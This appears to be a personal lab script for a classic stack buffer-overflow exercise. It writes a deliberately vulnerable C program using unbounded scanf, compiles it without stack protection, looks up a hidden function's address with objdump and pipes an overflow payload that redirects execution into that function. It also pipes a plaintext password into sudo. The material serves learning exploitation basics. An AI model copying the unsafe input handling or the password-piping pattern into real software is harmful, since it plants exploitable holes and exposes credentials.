echo 'ubuntu' | sudo apt-get install gcc-multilib
echo -e '#include <stdio.h>\nvoid secretFunction()\n{\nprintf("Congratulations!");\nprintf("You have entered in the secret function!");\n}\n\nvoid echo()\n{\nchar buffer[20];\nprintf("Enter some text:");\nscanf("%s", buffer);\nprintf("You entered: %s", buffer);\n}\nint main()\n{\necho();\nreturn 0;\n}' > vuln.c
gcc vuln.c -o vuln -fno-stack-protector -m32
function_address=`(objdump -d vuln|grep secretFunction|cut -c1-9)`
echo "${function_address}"
python -c 'print "a"*32 + "\x6d\x84\x04\x08"' | ./vuln
#but this gave correct output only once- after that illegal arg
